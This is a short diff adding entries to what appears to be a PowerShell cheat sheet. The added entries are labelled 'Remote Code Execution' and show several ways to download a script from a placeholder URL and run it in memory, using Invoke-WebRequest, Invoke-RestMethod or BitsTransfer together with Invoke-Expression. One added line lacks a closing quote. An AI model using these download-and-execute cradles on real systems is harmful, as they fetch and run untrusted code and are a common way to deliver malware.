@@ -68,3 +68,17 @@
 \# Remote Code Execution - IEX = Invoke-Expression (run script from memory)  
 `$url = "https://site.com/script.ps1"`  
 `IEX (New-Object System.Net.WebClient).DownloadString($url)`  
+\# Remote Code Execution - Invoke-WebRequest (run script from memory)  
+`$url = "https://site.com/script.ps1`  
+`$script = Invoke-WebRequest -Uri $url -UseBasicParsing`  
+`Invoke-Expression $script.Content`  
+\# Remote Code Execution - Invoke-RestMethod (run script from memory)  
+`$url = "https://site.com/script.ps1"`  
+`$script = Invoke-RestMethod -Uri $url`  
+`Invoke-Expression $script`  
+\# Remote Code Execution - BitsTransfer (run script from memory)  
+`$url = "https://site.com/script.ps1"`  
+`Import-Module BitsTransfer`  
+`Start-BitsTransfer -Source $url -Destination "script.ps1"`  
+`Invoke-Expression -Command (Get-Content -Path "script.ps1" -Raw)`  
+
